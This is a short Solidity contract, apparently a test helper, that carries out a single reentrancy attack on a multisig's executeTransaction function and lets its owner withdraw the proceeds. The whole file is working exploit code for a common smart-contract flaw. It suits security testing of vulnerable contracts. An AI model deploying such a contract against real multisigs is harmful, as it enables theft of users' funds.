// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerable {
    function executeTransaction(uint256 proposalId) external;
}

contract ReentrancyAttacker {
    address public owner;
    IVulnerable public target;
    uint256 public proposalId;
    bool private reentered;

    event Received(address sender, uint256 amount, bool reenteredAttempted);

    constructor(address _target) payable {
        owner = msg.sender;
        target = IVulnerable(_target);
        reentered = false;
    }

    // set the proposal id to re-enter (set by deployer/test runner after proposal created)
    function setProposalId(uint256 id) external {
        require(msg.sender == owner, "not owner");
        proposalId = id;
    }

    // receive will attempt a single re-entry into the vulnerable multisig
    receive() external payable {
        bool attempted = false;
        if (!reentered) {
            reentered = true;
            attempted = true;
            // attempt to call executeTransaction on the vulnerable multisig again
            // this will re-enter the multisig if it sets executed after external call
            // ignoring return intentionally
            target.executeTransaction(proposalId);
        }
        emit Received(msg.sender, msg.value, attempted);
    }

    // helper to withdraw funds after test
    function withdraw(address payable to) external {
        require(msg.sender == owner, "not owner");
        to.transfer(address(this).balance);
    }
}
